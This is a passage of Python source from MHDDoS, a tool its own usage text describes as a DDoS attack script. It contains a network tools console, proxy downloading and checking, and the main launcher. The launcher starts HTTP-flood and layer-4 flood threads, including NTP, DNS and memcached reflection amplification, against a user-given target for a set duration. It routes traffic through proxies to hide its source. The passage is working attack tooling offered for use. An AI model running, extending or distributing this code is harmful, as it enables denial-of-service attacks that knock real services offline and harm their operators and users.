            cmd = input(cons + " ").strip()
            if not cmd: continue
            if " " in cmd:
                cmd, args = cmd.split(" ", 1)

            cmd = cmd.upper()
            if cmd == "HELP":
                print("Tools:" + ", ".join(ToolsConsole.METHODS))
                print("Commands: HELP, CLEAR, BACK, EXIT")
                continue

            if (cmd == "E") or \
                    (cmd == "EXIT") or \
                    (cmd == "Q") or \
                    (cmd == "QUIT") or \
                    (cmd == "LOGOUT") or \
                    (cmd == "CLOSE"):
                exit(-1)

            if cmd == "CLEAR":
                print("\033c")
                continue

            if not {cmd} & ToolsConsole.METHODS:
                print("%s command not found" % cmd)
                continue

            if cmd == "DSTAT":
                with suppress(KeyboardInterrupt):
                    ld = net_io_counters(pernic=False)

                    while True:
                        sleep(1)

                        od = ld
                        ld = net_io_counters(pernic=False)

                        t = [(last - now) for now, last in zip(od, ld)]

                        logger.info(
                            ("Bytes Sended %s\n"
                             "Bytes Recived %s\n"
                             "Packets Sended %s\n"
                             "Packets Recived %s\n"
                             "ErrIn %s\n"
                             "ErrOut %s\n"
                             "DropIn %s\n"
                             "DropOut %s\n"
                             "Cpu Usage %s\n"
                             "Memory %s\n") %
                            (Tools.humanbytes(t[0]), Tools.humanbytes(t[1]),
                             Tools.humanformat(t[2]), Tools.humanformat(t[3]),
                             t[4], t[5], t[6], t[7], str(cpu_percent()) + "%",
                             str(virtual_memory().percent) + "%"))
            if cmd in ["CFIP", "DNS"]:
                print("Soon")
                continue

            if cmd == "CHECK":
                while True:
                    with suppress(Exception):
                        domain = input(f'{cons}give-me-ipaddress# ')
                        if not domain: continue
                        if domain.upper() == "BACK": break
                        if domain.upper() == "CLEAR":
                            print("\033c")
                            continue
                        if (domain.upper() == "E") or \
                                (domain.upper() == "EXIT") or \
                                (domain.upper() == "Q") or \
                                (domain.upper() == "QUIT") or \
                                (domain.upper() == "LOGOUT") or \
                                (domain.upper() == "CLOSE"):
                            exit(-1)
                        if "/" not in domain: continue
                        print('please wait ...', end="\r")

                        with get(domain, timeout=20) as r:
                            print(('status_code: %d\n'
                                   'status: %s') %
                                  (r.status_code, "ONLINE"
                                  if r.status_code <= 500 else "OFFLINE"))
                            return
                    print("Error!")

            if cmd == "INFO":
                while True:
                    domain = input(f'{cons}give-me-ipaddress# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                        continue
                    if (domain.upper() == "E") or \
                            (domain.upper() == "EXIT") or \
                            (domain.upper() == "Q") or \
                            (domain.upper() == "QUIT") or \
                            (domain.upper() == "LOGOUT") or \
                            (domain.upper() == "CLOSE"):
                        exit(-1)
                    domain = domain.replace('https://',
                                            '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]
                    print('please wait ...', end="\r")

                    info = ToolsConsole.info(domain)

                    if not info["success"]:
                        print("Error!")
                        continue

                    logger.info(("Country: %s\n"
                                 "City: %s\n"
                                 "Org: %s\n"
                                 "Isp: %s\n"
                                 "Region: %s\n") %
                                (info["country"], info["city"], info["org"],
                                 info["isp"], info["region"]))

            if cmd == "TSSRV":
                while True:
                    domain = input(f'{cons}give-me-domain# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                        continue
                    if (domain.upper() == "E") or \
                            (domain.upper() == "EXIT") or \
                            (domain.upper() == "Q") or \
                            (domain.upper() == "QUIT") or \
                            (domain.upper() == "LOGOUT") or \
                            (domain.upper() == "CLOSE"):
                        exit(-1)
                    domain = domain.replace('https://',
                                            '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]
                    print('please wait ...', end="\r")

                    info = ToolsConsole.ts_srv(domain)
                    logger.info("TCP: %s\n" % (info['_tsdns._tcp.']))
                    logger.info("UDP: %s\n" % (info['_ts3._udp.']))

            if cmd == "PING":
                while True:
                    domain = input(f'{cons}give-me-ipaddress# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                    if (domain.upper() == "E") or \
                            (domain.upper() == "EXIT") or \
                            (domain.upper() == "Q") or \
                            (domain.upper() == "QUIT") or \
                            (domain.upper() == "LOGOUT") or \
                            (domain.upper() == "CLOSE"):
                        exit(-1)

                    domain = domain.replace('https://',
                                            '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]

                    print('please wait ...', end="\r")
                    r = ping(domain, count=5, interval=0.2)
                    logger.info(('Address: %s\n'
                                 'Ping: %d\n'
                                 'Aceepted Packets: %d/%d\n'
                                 'status: %s\n') %
                                (r.address, r.avg_rtt, r.packets_received,
                                 r.packets_sent,
                                 "ONLINE" if r.is_alive else "OFFLINE"))

    @staticmethod
    def stop():
        print('All Attacks has been Stopped !')
        for proc in process_iter():
            if proc.name() == "python.exe":
                proc.kill()

    @staticmethod
    def usage():
        print((
                  '* MHDDoS - DDoS Attack Script With %d Methods\n'
                  'Note: If the Proxy list is empty, the attack will run without proxies\n'
                  '      If the Proxy file doesn\'t exist, the script will download proxies and check them.\n'
                  '      Proxy Type 0 = All in config.json\n'
                  '      SocksTypes:\n'
                  '         - 6 = RANDOM\n'
                  '         - 5 = SOCKS5\n'
                  '         - 4 = SOCKS4\n'
                  '         - 1 = HTTP\n'
                  '         - 0 = ALL\n'
                  ' > Methods:\n'
                  ' - Layer4\n'
                  ' | %s | %d Methods\n'
                  ' - Layer7\n'
                  ' | %s | %d Methods\n'
                  ' - Tools\n'
                  ' | %s | %d Methods\n'
                  ' - Others\n'
                  ' | %s | %d Methods\n'
                  ' - All %d Methods\n'
                  '\n'
                  'Example:\n'
                  '   L7: python3 %s <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> <debug=optional>\n'
                  '   L4: python3 %s <method> <ip:port> <threads> <duration>\n'
                  '   L4 Proxied: python3 %s <method> <ip:port> <threads> <duration> <socks_type> <proxylist>\n'
                  '   L4 Amplification: python3 %s <method> <ip:port> <threads> <duration> <reflector file (only use with'
                  ' Amplification)>\n') %
              (len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
               ", ".join(Methods.LAYER4_METHODS), len(Methods.LAYER4_METHODS),
               ", ".join(Methods.LAYER7_METHODS), len(Methods.LAYER7_METHODS),
               ", ".join(ToolsConsole.METHODS), len(ToolsConsole.METHODS),
               ", ".join(["TOOLS", "HELP", "STOP"]), 3,
               len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
               argv[0], argv[0], argv[0], argv[0]))

    # noinspection PyBroadException
    @staticmethod
    def ts_srv(domain):
        records = ['_ts3._udp.', '_tsdns._tcp.']
        DnsResolver = resolver.Resolver()
        DnsResolver.timeout = 1
        DnsResolver.lifetime = 1
        Info = {}
        for rec in records:
            try:
                srv_records = resolver.resolve(rec + domain, 'SRV')
                for srv in srv_records:
                    Info[rec] = str(srv.target).rstrip('.') + ':' + str(
                        srv.port)
            except:
                Info[rec] = 'Not found'

        return Info

    # noinspection PyUnreachableCode
    @staticmethod
    def info(domain):
        with suppress(Exception), get("https://ipwhois.app/json/%s/" %
                                      domain) as s:
            return s.json()
        return {"success": False}


def handleProxyList(con, proxy_li, proxy_ty, url=None):
    if proxy_ty not in {4, 5, 1, 0, 6}:
        exit("Socks Type Not Found [4, 5, 1, 0, 6]")
    if proxy_ty == 6:
        proxy_ty = randchoice([4, 5, 1])
    if not proxy_li.exists():
        logger.warning("The file doesn't exist, creating files and downloading proxies.")
        proxy_li.parent.mkdir(parents=True, exist_ok=True)
        with proxy_li.open("w") as wr:
            Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
            logger.info(
                f"{len(Proxies):,} Proxies are getting checked, this may take awhile!"
            )
            Proxies = ProxyChecker.checkAll(
                Proxies, timeout=1, threads=threads,
                url=url.human_repr() if url else "https://google.com",
            )

            if not Proxies:
                exit(
                    "Proxy Check failed, Your network may be the problem"
                    " | The target may not be available."
                )
            stringBuilder = ""
            for proxy in Proxies:
                stringBuilder += (proxy.__str__() + "\n")
            wr.write(stringBuilder)

    proxies = ProxyUtiles.readFromFile(proxy_li)
    if proxies:
        logger.info(f"Proxy Count: {len(proxies):,}")
    else:
        logger.info(
            "Empty Proxy File, running flood witout proxy")
        proxies = None

    return proxies


if __name__ == '__main__':
    with open(__dir__ / "config.json") as f:
        con = load(f)
        with suppress(KeyboardInterrupt):
            with suppress(IndexError):
                one = argv[1].upper()

                if one == "HELP":
                    raise IndexError()
                if one == "TOOLS":
                    ToolsConsole.runConsole()
                if one == "STOP":
                    ToolsConsole.stop()

                method = one
                host = None
                url = None
                event = Event()
                event.clear()
                target = None
                urlraw = argv[2].strip()
                if not urlraw.startswith("http"):
                    urlraw = "http://" + urlraw

                if method not in Methods.ALL_METHODS:
                    exit("Method Not Found %s" %
                         ", ".join(Methods.ALL_METHODS))

                if method in Methods.LAYER7_METHODS:
                    url = URL(urlraw)
                    host = url.host
                    try:
                        host = gethostbyname(url.host)
                    except Exception as e:
                        exit('Cannot resolve hostname ', url.host, e)
                    threads = int(argv[4])
                    rpc = int(argv[6])
                    timer = int(argv[7])
                    proxy_ty = int(argv[3].strip())
                    proxy_li = Path(__dir__ / "files/proxies/" /
                                    argv[5].strip())
                    useragent_li = Path(__dir__ / "files/useragent.txt")
                    referers_li = Path(__dir__ / "files/referers.txt")
                    bombardier_path = Path(__dir__ / "go/bin/bombardier")
                    proxies: Any = set()

                    if method == "BOMB":
                        assert (
                                bombardier_path.exists()
                                or bombardier_path.with_suffix('.exe').exists()
                        ), (
                            "Install bombardier: "
                            "https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"
                        )

                    if len(argv) == 9:
                        logger.setLevel("DEBUG")

                    if not useragent_li.exists():
                        exit("The Useragent file doesn't exist ")
                    if not referers_li.exists():
                        exit("The Referer file doesn't exist ")

                    uagents = set(a.strip()
                                  for a in useragent_li.open("r+").readlines())
                    referers = set(a.strip()
                                   for a in referers_li.open("r+").readlines())

                    if not uagents: exit("Empty Useragent File ")
                    if not referers: exit("Empty Referer File ")

                    if threads > 1000:
                        logger.warning("Thread is higher than 1000")
                    if rpc > 100:
                        logger.warning(
                            "RPC (Request Pre Connection) is higher than 100")

                    proxies = handleProxyList(con, proxy_li, proxy_ty, url)
                    for _ in range(threads):
                        HttpFlood(url, host, method, rpc, event, uagents,
                                  referers, proxies).start()

                if method in Methods.LAYER4_METHODS:
                    target = URL(urlraw)

                    port = target.port
                    target = target.host

                    try:
                        target = gethostbyname(target)
                    except Exception as e:
                        exit('Cannot resolve hostname ', url.host, e)

                    if port > 65535 or port < 1:
                        exit("Invalid Port [Min: 1 / Max: 65535] ")

                    if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD", "SYN"} and \
                            not ToolsConsole.checkRawSocket():
                        exit("Cannot Create Raw Socket")

                    threads = int(argv[3])
                    timer = int(argv[4])
                    proxies = None
                    ref = None
                    if not port:
                        logger.warning("Port Not Selected, Set To Default: 80")
                        port = 80

                    if len(argv) >= 6:
                        argfive = argv[5].strip()
                        if argfive:
                            refl_li = Path(__dir__ / "files" / argfive)
                            if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD"}:
                                if not refl_li.exists():
                                    exit("The reflector file doesn't exist")
                                if len(argv) == 7:
                                    logger.setLevel("DEBUG")
                                ref = set(a.strip()
                                          for a in ProxyTools.Patterns.IP.findall(
                                    refl_li.open("r+").read()))
                                if not ref: exit("Empty Reflector File ")

                            elif argfive.isdigit() and len(argv) >= 7:
                                if len(argv) == 8:
                                    logger.setLevel("DEBUG")
                                proxy_ty = int(argfive)
                                proxy_li = Path(__dir__ / "files/proxies" / argv[6].strip())
                                proxies = handleProxyList(con, proxy_li, proxy_ty)
                                if method not in {"MINECRAFT", "MCBOT", "TCP"}:
                                    exit("this method cannot use for layer4 proxy")

                            else:
                                logger.setLevel("DEBUG")

                    for _ in range(threads):
                        Layer4((target, port), ref, method, event,
                               proxies).start()

                logger.info(
                    "Attack Started to %s with %s method for %s seconds, threads: %d!"
                    % (target or url.human_repr(), method, timer, threads))
                event.set()
                ts = time()
                while time() < ts + timer:
                    logger.debug('PPS: %s, BPS: %s / %d%%' %
                                 (Tools.humanformat(int(REQUESTS_SENT)),
                                  Tools.humanbytes(int(bytes_sent)),
                                  round((time() - ts) / timer * 100, 2)))
                    REQUESTS_SENT.set(0)
                    bytes_sent.set(0)
                    sleep(1)

                event.clear()
                exit()

            ToolsConsole.usage()
